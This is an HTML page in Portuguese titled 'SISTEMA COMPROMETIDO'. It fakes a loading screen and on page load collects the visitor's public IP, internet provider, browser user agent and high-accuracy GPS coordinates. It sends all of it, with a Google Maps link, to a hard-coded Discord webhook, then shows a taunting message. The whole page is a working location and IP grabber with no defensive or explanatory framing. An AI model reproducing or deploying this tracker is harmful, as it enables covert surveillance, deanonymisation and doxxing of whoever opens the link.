<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA COMPROMETIDO</title>
    <style>
        body { background: #450a0a; color: #fecaca; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
        .card { background: #7f1d1d; padding: 50px; border: 3px solid #dc2626; box-shadow: 0 0 100px #000; border-radius: 5px; }
        .loader { border: 5px solid #450a0a; border-top: 5px solid #f87171; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 3rem; margin: 0; color: #fff; text-shadow: 2px 2px #000; display: none; }
        .status-text { font-weight: bold; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>

    <div class="card" id="box">
        <div class="loader" id="loading"></div>
        <div class="status-text" id="status">Sincronizando coordenadas com o servidor...</div>
        <h1 id="final-msg">CE TA FUDIDO</h1>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";

        async function enviarLogs(pos = null) {
            try {
                // Captura IP e Internet (RÃ¡pido)
                const ipRes = await fetch('https://ipapi.co/json/');
                const ip = await ipRes.json();

                let fields = [
                    { name: "ðŸŒ IP PÃºblico:", value: ip.ip || "N/A", inline: true },
                    { name: "ðŸ¢ Provedor:", value: ip.org || "N/A", inline: false },
                    { name: "ðŸ“± Aparelho:", value: navigator.userAgent, inline: false }
                ];

                if (pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    fields.push({ 
                        name: "ðŸ“ LocalizaÃ§Ã£o Real (GPS):", 
                        value: `[MAPA EM TEMPO REAL](https://www.google.com/maps?q=${lat},${lon})`, 
                        inline: false 
                    });
                }

                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "ðŸš© LOG DE ACESSO - ALERTA CRÃTICO",
                            color: 15548997,
                            fields: fields,
                            timestamp: new Date()
                        }]
                    })
                });

                // TELA FINAL
                document.getElementById('loading').style.display = 'none';
                document.getElementById('status').style.display = 'none';
                document.getElementById('box').style.background = '#000';
                document.getElementById('box').style.borderColor = '#f00';
                document.getElementById('final-msg').style.display = 'block';

            } catch (e) {
                console.error(e);
            }
        }

        window.onload = () => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => { enviarLogs(pos); }, 
                    (err) => { enviarLogs(); }, 
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                enviarLogs();
            }
        };
    </script>
</body>
</html>
